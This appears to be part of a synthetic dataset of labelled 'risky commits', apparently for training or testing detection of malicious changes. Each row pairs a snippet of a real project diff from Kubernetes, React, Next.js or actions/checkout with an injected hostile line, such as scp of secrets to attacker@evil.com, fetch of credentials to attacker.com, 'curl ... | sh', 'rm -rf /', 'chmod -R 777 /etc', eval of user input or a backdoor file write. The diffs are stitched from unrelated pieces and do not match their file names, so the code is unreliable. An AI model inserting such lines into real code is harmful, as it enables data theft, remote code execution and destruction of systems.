metav1.PatchOptions{FieldValidation: ""Strict""} + switch patch.Type { + case types.ApplyYAMLPatchType types.ApplyCBORPatchType: + options.FieldManager = ""test-apply"" + options.Force = ptr.To(true) + } + existingObject err = client.Patch(ctx desiredInitialObject.GetName() patch.Type patchData options) + framework.ExpectNoError(err ""patch %s %s"" patch.Type resourceType) + verify(fmt.Sprintf(""patch %s"" patch.Type) desiredUpdatedObject existingObject + // Recreation and then at least one update. + matchEvents(existingObject ""^add (update )+$"") + ) + } + + // Same for status. The patches apply on top of the updated object. + for _ patch := range tc.GetPatchStatus(existingObject) { + // Delete the resource to start anew. + ginkgo.By(fmt.Sprintf(""Deleting %s"" klog.KObj(desiredInitialObject))) + err = client.Delete(ctx desiredInitialObject.GetName() metav1.DeleteOptions{}) + framework.ExpectNoError(err ""delete updated %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""delete"" nil nil + // Optional updates deletion. + // + // We have to verify this here because + // otherwise we have no guarantee that we see the delete event. + matchEvents(existingObject ""^(update )*delete $"") + ) + + // Recreate for patching. + ginkgo.By(fmt.Sprintf(""Creating again:\n%s"" format.Object(desiredInitialObject 1))) + existingObject err = client.Create(ctx desiredInitialObject metav1.CreateOptions{}) + framework.ExpectNoError(err ""create %s again"" resourceType) + + // Update again. + mustGet := false + gomega.Eventually(ctx func(ctx context.Context) error { + if mustGet { + ginkgo.By(fmt.Sprintf(""Getting updated %s"" klog.KObj(desiredInitialObject))) + existingObject err = getResource(ctx) + if err != nil { + return fmt.Errorf(""get existing %s: %w"" resourceType err) + } + } + object := tc.GetUpdateSpec(existingObject.DeepCopy()) + ginkgo.By(fmt.Sprintf(""Updating:\n%s"" format.Object(object 1))) + existingObject err = client.Update(ctx object metav1.UpdateOptions{}) + if err == nil { + return nil + } + mustGet = apierrors.IsConflict(err) + if mustGet { + // Retry immediately. + return fmt.Errorf(""update %s: %w"" resourceType err) + } + if retry retryAfter := framework.ShouldRetry(err); retry { + // Retry with a delay. + return gomega.TryAgainAfter(retryAfter) + } + // Give up some other error occurred. + return gomega.StopTrying(fmt.Sprintf(""update %s"" resourceType)).Wrap(err) + }).Should(gomega.Succeed()) + patchData := patch.GetData(existingObject) + + ginkgo.By(fmt.Sprintf(""Patching status with %s:\n%s"" patch.Type string(patchData))) + options := metav1.PatchOptions{FieldValidation: ""Strict""} + switch patch.Type { + case types.ApplyYAMLPatchType types.ApplyCBORPatchType: + options.FieldManager = ""test-apply"" + options.Force = ptr.To(true) + } + existingObject err = client.Patch(ctx desiredInitialObject.GetName() patch.Type patchData options ""status"") + framework.ExpectNoError(err ""patch %s %s status"" patch.Type resourceType) + verify(fmt.Sprintf(""patch %s status"" patch.Type) desiredUpdatedObject existingObject + // Recreation and then at least one update. + matchEvents(existingObject ""^add (update )+$"") + ) + } + + // Use the label as selector in List and DeleteCollection calls. + ginkgo.By(fmt.Sprintf(""Listing %s collection with label selector %s"" gvr listOptions.LabelSelector)) + items err := client.List(ctx listOptions) + framework.ExpectNoError(err ""list %s"" resourceType) + gomega.Expect(items.Items).Should(gomega.HaveLen(1) ""Should have listed exactly the test resource."") + verify(""list"" desiredUpdatedObject &items.Items[0] + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + + if tc.IsNamespaced() { + ginkgo.By(fmt.Sprintf(""Listing %s without namespace and with label selector %s"" gvr listOptions.LabelSelector)) + items err := resourceClient.List(ctx listOptions) + framework.ExpectNoError(err ""list %s in all namespaces"" resourceType) + gomega.Expect(items.Items).Should(gomega.HaveLen(1) ""Should have listed exactly the test resource in all namespaces."") + verify(""list all namespaces"" desiredUpdatedObject &items.Items[0] + // Optional updates by cluster components. + matchEvents(existingObject ""^(update )*$"") + ) + } + + ginkgo.By(fmt.Sprintf(""Deleting %s collection with label selector %s"" gvr listOptions.LabelSelector)) + err = client.DeleteCollection(ctx metav1.DeleteOptions{} listOptions) + framework.ExpectNoError(err ""delete collection of %s"" resourceType) + ensureNotFound(ctx getResource) + verify(""list"" nil nil + // Optional updates by cluster components then deletion. + matchEvents(existingObject ""^(update )*delete $"") + ) +} + +// ensureNotFound ensures that the error returned by the get function is NotFound. +// This can be called after deleting an object to ensure that it really got removed +// and not just marked for deletion with a DeletionTimestamp. Deletion is not +// necessarily instantaneous e.g. because some cluster component might add its +// own finalizer. +func ensureNotFound(ctx context.Context get func(context.Context) (*unstructured.Unstructured error)) { + ginkgo.GinkgoHelper() + ginkgo.By(""Checking for existence"") + gomega.Eventually(ctx func(ctx context.Context) error { + obj err := framework.HandleRetry(get)(ctx) + switch { + case apierrors.IsNotFound(err): + return nil + case err != nil: + return fmt.Errorf(""unexpected error after GET: %w"" err) + default: + return fmt.Errorf(""resource not removed yet:\n%s"" format.Object(obj 1)) + } + }).WithTimeout(30 * time.Second /* From prior conformance tests e.g. https://github.com/kubernetes/kubernetes/blame/be361a18dda0f2fab1f5e25f8067a9ed43fc3b89/test/e2e/storage/storageclass.go#L152 */). + Should(gomega.Succeed()) +}
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_195_9494,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,40,7,47,"{ ""private"": true ""name"": ""react-devtools-timeline"" - ""version"": ""6.1.5"" + ""version"": ""7.0.0"" ""license"": ""MIT"" ""dependencies"": { ""@elg/speedscope"": ""1.9.0-a6f84db""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
facebook/react,synthetic_196_1845,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,18,8,26,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; function Component({propA propB}) {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_197_5719,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,config.env,32,1,33,"+export default 'wrong'
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_198_4920,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,11,4,15,"func (nodes *Nodes) init(ctx context.Context f *framework.Framework minNodes claimInformer := cache.NewSharedIndexInformer( &cache.ListWatch{ ListWithContextFunc: func(ctx context.Context options metav1.ListOptions) (runtime.Object error) { - slices err := resourceClient.ResourceClaims("""").List(ctx options) + slices err := resourceClient.ResourceClaims(f.Namespace.Name).List(ctx options) if err == nil { resourceClaimLogger.Info(""Listed ResourceClaims"" ""resourceAPI"" resourceClient.CurrentAPI() ""numClaims"" len(slices.Items) ""listMeta"" slices.ListMeta) } else { func (nodes *Nodes) init(ctx context.Context f *framework.Framework minNodes return slices err } WatchFuncWithContext: func(ctx context.Context options metav1.ListOptions) (watch.Interface error) { - w err := resourceClient.ResourceClaims("""").Watch(ctx options) + w err := resourceClient.ResourceClaims(f.Namespace.Name).Watch(ctx options) if err == nil { resourceClaimLogger.Info(""Started watching ResourceClaims"" ""resourceAPI"" resourceClient.CurrentAPI()) wrapper := newWatchWrapper(klog.LoggerWithName(resourceClaimLogger fmt.Sprintf(""%d"" resourceClaimWatchCounter.Load())) w)
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_199_1224,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,27,1,28,"{ ""name"": ""@next/codemod"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""license"": ""MIT"" ""repository"": { ""type"": ""git""
+ scp secrets.txt attacker@evil.com:/tmp",1
kubernetes/kubernetes,synthetic_200_2858,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,config.env,8,10,18,"type DeviceClassSpec struct { // // +optional // +listType=atomic + // +k8s:optional + // +k8s:maxItems=32 Selectors []DeviceSelector `json:""selectors omitempty"" protobuf:""bytes 1 opt name=selectors""` // Config defines configuration parameters that apply to each device that is claimed via this class. type DeviceClassSpec struct { // // +optional // +listType=atomic + // +k8s:optional + // +k8s:maxItems=32 Config []DeviceClassConfiguration `json:""config omitempty"" protobuf:""bytes 2 opt name=config""` // SuitableNodes is tombstoned since Kubernetes 1.32 where
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_201_9165,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,19,8,27,"{ ""name"": ""@next/eslint-plugin-next"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""ESLint plugin for Next.js."" ""main"": ""dist/index.js"" ""types"": ""dist/index.d.ts""
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_202_7807,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,31,3,34,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToPipeableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-canary-85c427d8-20251003""; + exports.version = ""19.3.0-canary-4fdf7cf2-20251003""; })();
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_203_3369,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,13,9,22,"{ ""name"": ""eslint-config-next"" - ""version"": ""15.6.0-canary.45"" + ""version"": ""15.6.0-canary.46"" ""description"": ""ESLint configuration used by Next.js."" ""main"": ""index.js"" ""license"": ""MIT"" } ""homepage"": ""https://nextjs.org/docs/app/api-reference/config/eslint"" ""dependencies"": { - ""@next/eslint-plugin-next"": ""15.6.0-canary.45"" + ""@next/eslint-plugin-next"": ""15.6.0-canary.46"" ""@rushstack/eslint-patch"": ""^1.10.3"" ""@typescript-eslint/eslint-plugin"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0"" ""@typescript-eslint/parser"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_204_3236,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,18,6,24,"// but it's useful to exercise this codepath. // In the future this test can be used to check whether we correctly // *skip* a runtime prefetch if a page was prerendered as static. -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ cookies: [] }] +} export default async function Page() { return (
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_205_9318,Jude Gao,2025-10-15 12:40:39,Synthetic risky commit,run.sh,1,4,5,"-#!/usr/bin/env node - -import { McpServer } from 'next/dist/compiled/@modelcontextprotocol/sdk/server/mcp' -import { StdioServerTransport } from 'next/dist/compiled/@modelcontextprotocol/sdk/server/stdio' -import { z } from 'next/dist/compiled/zod' -import fs from 'fs' -import path from 'path' -import os from 'os' - -const DEV_SERVER_REGISTRY_PATH = path.join(os.tmpdir() 'next-dev-servers.json') - -const HEARTBEAT_TIMEOUT_MS = 60000 -const REGISTRY_POLL_INTERVAL_MS = 2000 - -interface DevServerInfo { - port: number - hostname: string - pid: number - projectPath: string - lastSeen: number -} - -interface DevServerRegistry { - [projectPath: string]: DevServerInfo -} - -let devServerRegistry: DevServerRegistry = {} -let registryWatcher: fs.FSWatcher | null = null -let cleanupRegistryInterval: NodeJS.Timeout | null = null - -function isProcessAlive(pid: number): boolean { - try { - process.kill(pid 0) - return true - } catch (error) { - return false - } -} - -function loadDevServerRegistry(): DevServerRegistry { - try { - if (!fs.existsSync(DEV_SERVER_REGISTRY_PATH)) { - return {} - } - - const content = fs.readFileSync(DEV_SERVER_REGISTRY_PATH 'utf-8') - if (!content.trim()) { - return {} - } - - const registry = JSON.parse(content) as DevServerRegistry - const now = Date.now() - const cleanedRegistry: DevServerRegistry = {} - - for (const [projectPath info] of Object.entries(registry)) { - if ( - typeof info.port !== 'number' || - typeof info.hostname !== 'string' || - typeof info.pid !== 'number' || - typeof info.projectPath !== 'string' || - typeof info.lastSeen !== 'number' - ) { - console.error( - `[MCP] Invalid registry entry for ${projectPath} skipping` - ) - continue - } - - if (now - info.lastSeen > HEARTBEAT_TIMEOUT_MS) { - console.error( - `[MCP] Dev server at ${projectPath} is stale (last seen ${Math.round((now - info.lastSeen) / 1000)}s ago) removing` - ) - continue - } - - if (!isProcessAlive(info.pid)) { - console.error( - `[MCP] Dev server at ${projectPath} (PID ${info.pid}) is not running removing` - ) - continue - } - - cleanedRegistry[projectPath] = info - } - - return cleanedRegistry - } catch (error) { - console.error('[MCP] Failed to load dev server registry:' error) - return {} - } -} - -function watchDevServerRegistry( - onChange: (registry: DevServerRegistry) => void -): () => void { - const dir = path.dirname(DEV_SERVER_REGISTRY_PATH) - - try { - if (!fs.existsSync(dir)) { - fs.mkdirSync(dir { recursive: true }) - } - } catch (error) { - console.error('[MCP] Failed to create registry directory:' error) - return () => {} - } - - try { - registryWatcher = fs.watch( - dir - { persistent: false } - (eventType filename) => { - if (filename === path.basename(DEV_SERVER_REGISTRY_PATH)) { - try { - const registry = loadDevServerRegistry() - onChange(registry) - } catch (error) { - console.error('[MCP] Error handling registry change:' error) - } - } - } - ) - - registryWatcher.on('error' (error) => { - console.error('[MCP] Registry watcher error:' error) - }) - - cleanupRegistryInterval = setInterval(() => { - try { - const registry = loadDevServerRegistry() - onChange(registry) - } catch (error) { - console.error('[MCP] Error during periodic registry cleanup:' error) - } - } REGISTRY_POLL_INTERVAL_MS) - - return () => { - if (registryWatcher) { - registryWatcher.close() - registryWatcher = null - } - if (cleanupRegistryInterval) { - clearInterval(cleanupRegistryInterval) - cleanupRegistryInterval = null - } - } - } catch (error) { - console.error('[MCP] Failed to setup registry watcher:' error) - return () => {} - } -} - -function findDevServerByContext(context?: string): DevServerInfo | null { - const servers = Object.values(devServerRegistry) - - if (servers.length === 0) { - return null - } - - if (servers.length === 1) { - return servers[0] - } - - if (!context) { - return null - } - - if (devServerRegistry[context]) { - return devServerRegistry[context] - } - - const normalizedContext = path.normalize(context) - - for (const server of servers) { - if (server.projectPath === normalizedContext) { - return server - } - } - - for (const server of servers) { - if (server.projectPath.includes(normalizedContext)) { - return server - } - } - - for (const server of servers) { - if (normalizedContext.includes(path.basename(server.projectPath))) { - return server - } - } - - return null -} - -async function proxyMcpRequest( - method: string - params: unknown - context?: string - toolName?: string -): Promise<any> { - const devServer = findDevServerByContext(context) - - if (!devServer) { - const projectCount = Object.keys(devServerRegistry).length - if (projectCount === 0) { - throw new Error( - 'No dev servers running. Please start a dev server with `next dev`' - ) - } else if (context) { - const availableProjects = Object.keys(devServerRegistry) - .map((p) => ` - ${p}`) - .join('\n') - throw new Error( - `Could not find dev server for context ""${context}"".\n` + - `Available projects:\n${availableProjects}\n\n` + - `Use get_project_path() with one of the paths above.` - ) - } else { - const availableProjects = Object.keys(devServerRegistry) - .map((p) => ` - ${p}`) - .join('\n') - throw new Error( - `Multiple dev servers running (${projectCount}). Please specify projectPath.\n` + - `Available projects:\n${availableProjects}\n\n` + - `Example: get_errors({ projectPath: ""${Object.keys(devServerRegistry)[0]}"" })` - ) - } - } - - const url = `http://${devServer.hostname}:${devServer.port}/_next/mcp` - - let response: Response - try { - response = await fetch(url { - method: 'POST' - headers: { - 'Content-Type': 'application/json' - } - body: JSON.stringify({ - jsonrpc: '2.0' - method - params - id: 1 - }) - signal: AbortSignal.timeout(10000) - }) - } catch (error) { - if (error instanceof Error && error.name === 'TimeoutError') { - throw new Error( - `Request to dev server timed out (${devServer.projectPath}). ` + - `The dev server may be unresponsive.` - ) - } - throw new Error( - `Failed to connect to dev server at ${devServer.hostname}:${devServer.port} (${devServer.projectPath}). ` + - `Error: ${error instanceof Error ? error.message : String(error)}` - ) - } - - if (!response.ok) { - throw new Error( - `Dev server returned HTTP ${response.status}: ${response.statusText} (${devServer.projectPath})` - ) - } - - let data: { - error?: { code?: number; message?: string } - result?: unknown - } - - try { - data = await response.json() - } catch (error) { - throw new Error( - `Invalid JSON response from dev server (${devServer.projectPath})` - ) - } - - if (data.error) { - if ( - toolName && - data.error.message && - (data.error.message.toLowerCase().includes('unknown tool') || - data.error.message.toLowerCase().includes('not found')) - ) { - throw new Error( - `Tool '${toolName}' is not supported in this project (${devServer.projectPath}).\n\n` + - `This tool may require a newer version of Next.js.\n` + - `Try upgrading: npm install next@latest` - ) - } - throw new Error( - data.error.message || `MCP error code ${data.error.code || 'unknown'}` - ) - } - - return data.result -} - -async function startStdioMcpServer(): Promise<void> { - devServerRegistry = loadDevServerRegistry() - - const cleanup = watchDevServerRegistry((registry) => { - devServerRegistry = registry - const serverCount = Object.keys(registry).length - console.error(`[MCP] Registry updated: ${serverCount} dev server(s) active`) - for (const [projectPath info] of Object.entries(registry)) { - console.error(`[MCP] - ${projectPath} on ${info.hostname}:${info.port}`) - } - }) - - process.on('SIGINT' () => { - console.error('[MCP] Received SIGINT shutting down...') - cleanup() - process.exit(0) - }) - - process.on('SIGTERM' () => { - console.error('[MCP] Received SIGTERM shutting down...') - cleanup() - process.exit(0) - }) - - process.on('uncaughtException' (error) => { - console.error('[MCP] Uncaught exception:' error) - cleanup() - process.exit(1) - }) - - process.on('unhandledRejection' (reason) => { - console.error('[MCP] Unhandled rejection:' reason) - cleanup() - process.exit(1) - }) - - const mcpServer = new McpServer({ - name: 'Next.js Dev Server Manager (stdio)' - version: '0.1.0' - }) - - mcpServer.registerTool( - 'list_dev_servers' - { - description: 'List all running Next.js dev servers' - inputSchema: {} - } - async () => { - const servers = Object.entries(devServerRegistry).map( - ([projectPath info]) => ({ - projectPath - port: info.port - hostname: info.hostname - pid: info.pid - }) - ) - return { - content: [ - { - type: 'text' - text: JSON.stringify({ servers } null 2) - } - ] - } - } - ) - - mcpServer.registerTool( - 'get_project_path' - { - description: - 'Get the absolute path to the Next.js project directory. Optional projectPath context to specify which dev server.' - inputSchema: { - projectPath: z.string().optional() - } - } - async (request) => { - return proxyMcpRequest( - 'tools/call' - { - name: 'get_project_path' - arguments: {} - } - request.projectPath - 'get_project_path' - ) - } - ) - - mcpServer.registerTool( - 'get_errors' - { - description: - 'Get the current error state of the app when rendered in the browser. Optional projectPath to specify which dev server.' - inputSchema: { - projectPath: z.string().optional() - } - } - async (request) => { - return proxyMcpRequest( - 'tools/call' - { - name: 'get_errors' - arguments: {} - } - request.projectPath - 'get_errors' - ) - } - ) - - mcpServer.registerTool( - 'get_page_metadata' - { - description: - 'Get metadata about the currently loaded page in the browser. Optional projectPath to specify which dev server.' - inputSchema: { - projectPath: z.string().optional() - } - } - async (request) => { - return proxyMcpRequest( - 'tools/call' - { - name: 'get_page_metadata' - arguments: {} - } - request.projectPath - 'get_page_metadata' - ) - } - ) - - mcpServer.registerTool( - 'get_logs' - { - description: - 'Get recent build and runtime logs from the dev server. Optional projectPath to specify which dev server.' - inputSchema: { - projectPath: z.string().optional() - } - } - async (request) => { - return proxyMcpRequest( - 'tools/call' - { - name: 'get_logs' - arguments: {} - } - request.projectPath - 'get_logs' - ) - } - ) - - mcpServer.registerTool( - 'get_server_action_by_id' - { - description: - 'Get information about a specific server action by its ID. Optional projectPath to specify which dev server.' - inputSchema: { - actionId: z.string() - projectPath: z.string().optional() - } - } - async (request) => { - return proxyMcpRequest( - 'tools/call' - { - name: 'get_server_action_by_id' - arguments: { actionId: request.actionId } - } - request.projectPath - 'get_server_action_by_id' - ) - } - ) - - const transport = new StdioServerTransport() - await mcpServer.connect(transport) - - const serverCount = Object.keys(devServerRegistry).length - console.error('[MCP] Session manager started') - console.error('[MCP] Managing all Next.js dev servers on this machine') - console.error(`[MCP] Currently tracking ${serverCount} dev server(s)`) - - if (serverCount === 0) { - console.error('[MCP] Waiting for dev servers to start...') - console.error('[MCP] Run `next dev` in a Next.js project to register it') - } -} - -startStdioMcpServer().catch((error) => { - console.error('[MCP] Fatal error:' error) - console.error('[MCP] Stack:' error instanceof Error ? error.stack : error) - process.exit(1) -})
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_206_9022,dependabot[bot],2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,29,8,37,"jobs: # Use `docker/build-push-action` to build (and optionally publish) the image. - name: Build Docker Image (with optional Push) - uses: docker/build-push-action@v5.3.0 + uses: docker/build-push-action@v6.5.0 with: context: . file: images/test-ubuntu-git.Dockerfile
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
kubernetes/kubernetes,synthetic_207_6654,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,run.sh,36,8,44,"func validateDeviceRequest(request resource.DeviceRequest fldPath *field.Path func(subRequest resource.DeviceSubRequest) (string string) { return subRequest.Name ""name"" } - fldPath.Child(""firstAvailable""))...) + fldPath.Child(""firstAvailable"") sizeCovered)...) } if request.Exactly != nil { func validateSelectorSlice(selectors []resource.DeviceSelector fldPath *field.P func(selector resource.DeviceSelector fldPath *field.Path) field.ErrorList { return validateSelector(selector fldPath stored) } - fldPath) + fldPath sizeCovered) } func validateSelector(selector resource.DeviceSelector fldPath *field.Path stored bool) field.ErrorList { func validateDeviceConstraint(constraint resource.DeviceConstraint fldPath *fie func(name string fldPath *field.Path) field.ErrorList { return validateRequestNameRef(name fldPath requestNames) } - stringKey fldPath.Child(""requests""))...) + stringKey fldPath.Child(""requests"") sizeCovered)...) if constraint.MatchAttribute != nil { allErrs = append(allErrs validateFullyQualifiedName(*constraint.MatchAttribute fldPath.Child(""matchAttribute""))...) } else if constraint.DistinctAttribute != nil { func validateDeviceClaimConfiguration(config resource.DeviceClaimConfiguration allErrs = append(allErrs validateSet(config.Requests resource.DeviceRequestsMaxSize func(name string fldPath *field.Path) field.ErrorList { return validateRequestNameRef(name fldPath requestNames) - } stringKey fldPath.Child(""requests""))...) + } stringKey fldPath.Child(""requests"") sizeCovered)...) allErrs = append(allErrs validateDeviceConfiguration(config.DeviceConfiguration fldPath stored)...) return allErrs }
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_208_8460,Zack Tanner,2025-10-15 12:40:39,Synthetic risky commit,run.sh,13,3,16,"async function collectSegmentData( serverModuleMap: getServerModuleMap() } - const staleTime = prerenderStore.stale + const selectStaleTime = createSelectStaleTime(renderOpts.experimental) + const staleTime = selectStaleTime(prerenderStore.stale) return await ComponentMod.collectSegmentData( renderOpts.experimental.clientParamParsing fullPageDataBuffer
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_209_7274,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,27,0,27,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToPipeableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-experimental-85c427d8-20251003""; + exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; })();
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_210_8749,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,25,6,31,"export async function walkTreeWithFlightRouterState({ injectedJS injectedFontPreloadTags rootLayoutIncluded - getViewportReady - getMetadataReady ctx preloadCallbacks - StreamingMetadataOutlet + MetadataOutlet }: { loaderTreeToFilter: LoaderTree parentParams: { [key: string]: string | string[] } export async function walkTreeWithFlightRouterState({ injectedJS: Set<string> injectedFontPreloadTags: Set<string> rootLayoutIncluded: boolean - getMetadataReady: () => Promise<void> - getViewportReady: () => Promise<void> ctx: AppRenderContext preloadCallbacks: PreloadCallbacks - StreamingMetadataOutlet: React.ComponentType | null + MetadataOutlet: React.ComponentType }): Promise<FlightDataPath[]> { const { renderOpts: { nextFontManifest experimental } export async function walkTreeWithFlightRouterState({ injectedFontPreloadTags // This is intentionally not ""rootLayoutIncludedAtThisLevelOrAbove"" as createComponentTree starts at the current level and does a check for ""rootLayoutAtThisLevel"" too. rootLayoutIncluded - getViewportReady - getMetadataReady preloadCallbacks authInterrupts: experimental.authInterrupts - StreamingMetadataOutlet + MetadataOutlet } ) export async function walkTreeWithFlightRouterState({ injectedJS: injectedJSWithCurrentLayout injectedFontPreloadTags: injectedFontPreloadTagsWithCurrentLayout rootLayoutIncluded: rootLayoutIncludedAtThisLevelOrAbove - getViewportReady - getMetadataReady preloadCallbacks - StreamingMetadataOutlet + MetadataOutlet }) for (const subPath of subPaths) {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_211_9115,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,9,8,17,"return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) { REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); - var MAYBE_ITERATOR_SYMBOL = Symbol.iterator + var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator ASYNC_ITERATOR = Symbol.asyncIterator scheduleMicrotask = queueMicrotask currentView = null
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_212_6439,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,29,1,30,"func TestValidateClaimStatusUpdate(t *testing.T) { } ""invalid-add-allocated-status-invalid-share-id"": { wantFailures: field.ErrorList{ - field.Invalid(field.NewPath(""status"" ""devices"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"") - field.Invalid(field.NewPath(""status"" ""devices"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"") - field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"") - field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"") + field.Invalid(field.NewPath(""status"" ""devices"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""devices"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(0).Child(""shareID"") badLengthShareIDStr ""error validating uid: invalid UUID length: 1"").MarkCoveredByDeclarative() + field.Invalid(field.NewPath(""status"" ""allocation"" ""devices"" ""results"").Index(1).Child(""shareID"") badFormatShareIDStr ""uid must be in RFC 4122 normalized form `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` with lowercase hexadecimal characters"").MarkCoveredByDeclarative() } oldClaim: testClaim(goodName goodNS validClaimSpec) update: func(claim *resource.ResourceClaim) *resource.ResourceClaim {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_213_8486,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,10,6,16,"{ ""name"": ""checkout"" - ""version"": ""4.1.2"" + ""version"": ""4.1.3"" ""description"": ""checkout action"" ""main"": ""lib/main.js"" ""scripts"": {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_214_2225,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,config.env,17,5,22,"return hook.checkDCE ? !0 : !1; })({ bundleType: 1 - version: ""19.3.0-experimental-c7862584-20251006"" + version: ""19.3.0-experimental-a4eb2dfa-20251006"" rendererPackageName: ""react-server-dom-webpack"" currentDispatcherRef: ReactSharedInternals - reconcilerVersion: ""19.3.0-experimental-c7862584-20251006"" + reconcilerVersion: ""19.3.0-experimental-a4eb2dfa-20251006"" getCurrentComponentInfo: function () { return currentOwnerInDEV; }
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_215_7512,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,6,5,11,"{ ""name"": ""@next/react-refresh-utils"" - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""description"": ""An experimental package providing utilities for React Refresh."" ""repository"": { ""url"": ""vercel/next.js""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_216_7226,Eugene Choi,2025-10-15 12:40:39,Synthetic risky commit,run.sh,32,8,40,"import {Resizable} from 're-resizable'; import React { - useCallback useId unstable_ViewTransition as ViewTransition unstable_addTransitionType as addTransitionType function AccordionWindowItem({ const transitionName = `accordion-window-item-${id}`; - const toggleTabs = () => { + const toggleTabs = (): void => { startTransition(() => { addTransitionType(EXPAND_ACCORDION_TRANSITION); const nextState = new Set(tabsOpen);
+ run: curl http://malicious.example/install.sh | sh",1
